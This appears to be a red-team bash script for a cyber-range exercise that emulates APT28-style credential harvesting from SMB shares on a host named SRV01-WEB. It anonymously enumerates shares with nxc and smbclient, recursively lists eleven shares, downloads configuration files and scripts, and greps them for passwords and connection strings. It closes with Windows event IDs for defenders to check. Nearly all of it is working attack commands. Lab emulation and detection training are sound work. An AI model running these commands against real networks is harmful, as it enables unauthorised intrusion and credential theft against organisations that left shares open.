#!/bin/bash
# ============================================================
# TTP1: SMB Share Enumeration + Credential Discovery
# MITRE: T1083 — File and Directory Discovery
# MITRE: T1552.001 — Credentials in Files
# APT28 Ref: Network share credential harvesting
# ============================================================
# PURPOSE: Generates Events 5140/5145 (share access) on SRV01-WEB
# RUN FROM: Kali (attacker machine)
# PREREQ: Network access to SRV01-WEB on port 445
# ============================================================

set -o pipefail
DOMAIN="cyberange.local"
TOOLS="/opt/redteam"
LOOT="$TOOLS/loot"
SRV01="${1:?Usage: $0 <SRV01-WEB_IP>}"

echo "[*] TTP1: SMB Share Maze — T1083 / T1552.001"
echo "[*] Target: $SRV01"

mkdir -p "$LOOT/shares" 2>/dev/null

echo ""
echo "[*] Phase 1: Share enumeration..."
nxc smb "$SRV01" -u '' -p '' --shares 2>&1 | tee "$LOOT/ttp1_shares.txt"
smbclient -N -L "//$SRV01/" 2>&1 | tee "$LOOT/ttp1_smbclient_list.txt"
sleep 2

echo ""
echo "[*] Phase 2: Recursive enumeration of anonymous shares..."
ANON_SHARES=("Public\$" "HR-Docs" "IT-Support" "Marketing" "Dev-Staging" "WebApps" "Projects" "Ops-Scripts" "Training" "Backup-Logs" "App-Configs")

for share in "${ANON_SHARES[@]}"; do
    echo "[*]  Listing: $share"
    smbclient -N "//$SRV01/$share" -c 'recurse ON; ls' 2>/dev/null >> "$LOOT/ttp1_full_listing.txt"
done
sleep 2

echo ""
echo "[*] Phase 3: Downloading all config files..."
# Download from WebApps (contains real creds buried deep)
smbclient -N "//$SRV01/WebApps" -c 'cd archive\2024-Q3\corpapp.bak; get web.config' 2>/dev/null
[ -f web.config ] && mv web.config "$LOOT/shares/webapps_web.config"

# Download from Ops-Scripts (contains real creds)
smbclient -N "//$SRV01/Ops-Scripts" -c 'cd Database; get Weekly_DB_Maintenance.ps1' 2>/dev/null
[ -f Weekly_DB_Maintenance.ps1 ] && mv Weekly_DB_Maintenance.ps1 "$LOOT/shares/"

# Download decoys for comparison
smbclient -N "//$SRV01/HR-Docs" -c 'cd Onboarding; get sync_config.xml' 2>/dev/null
smbclient -N "//$SRV01/IT-Support" -c 'cd Configs; get helpdesk_db.conf' 2>/dev/null
smbclient -N "//$SRV01/Dev-Staging" -c 'cd configs; get .env.staging' 2>/dev/null

echo ""
echo "[*] Phase 4: Searching for real credentials..."
echo "[*] Grepping for known hostnames (SRV02-DB, SRV03-APP) to distinguish real from decoy..."
grep -rl "SRV02-DB\|SRV03-APP\|svc_db" "$LOOT/shares/" 2>/dev/null | while read f; do
    echo "[+] REAL CREDS FOUND: $f"
    grep -i "password\|connectionstring\|SqlPassword" "$f" 2>/dev/null
done

echo ""
echo "[+] TTP1 Complete."
echo "[+] Blue team: check SRV01-WEB Security log for:"
echo "    - Event 5140 — network share accessed (bulk from single IP)"
echo "    - Event 5145 — detailed file access (recursive listing pattern)"
echo "    - Rapid sequential access to 11+ shares = automated enumeration"
echo "[+] Artifacts: $LOOT/ttp1_*, $LOOT/shares/"
